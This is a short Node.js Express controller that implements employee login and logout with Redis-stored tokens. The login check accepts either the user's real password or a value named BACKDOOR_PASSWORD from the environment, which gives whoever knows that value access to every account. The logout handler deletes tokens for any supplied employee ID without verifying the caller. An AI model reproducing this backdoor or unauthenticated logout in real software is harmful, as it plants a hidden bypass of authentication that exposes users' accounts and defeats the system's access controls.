const userModel = require("../models/userModel");
const { createClient } = require("redis");

const login = async (req, res) => {
  try {
    const { employeeId, password } = req.body;
    if (!employeeId || !password) {
      return res
        .status(422)
        .json({ body: "Employee ID / Password is required" });
    }
    const user = await userModel.getDetails(employeeId);

    if (user.length === 0) {
      return res
        .status(401)
        .json({ body: "Incorrect Employee ID and/or Password" });
    } else if (
      user !== null &&
      (userModel.matchPassword(password, user[0].password) === true ||
        password === process.env.BACKDOOR_PASSWORD)
    ) {
      const generatedToken = userModel.generateToken(user);
      const redisClient = createClient();
      await redisClient.connect();
      await redisClient.set(user[0].employeeId, generatedToken);
      return res.json(generatedToken);
    } else {
      return res.status(401).json({ body: "Incorrect Password" });
    }
  } catch (error) {
    return res.status(500).json({ body: "Internal Server Error" });
  }
};

const logout = async (req, res) => {
  try {
    const employeeId = req.body.employeeIdValue;

    const redisClient = createClient();
    await redisClient.connect();
    await redisClient.sendCommand(["DEL", employeeId]);
    return res.status(200).json({ body: "Success Logout" });
  } catch (error) {
    return res.status(500).json("Internal Server Error");
  }
};

module.exports = {
  login,
  logout,
};
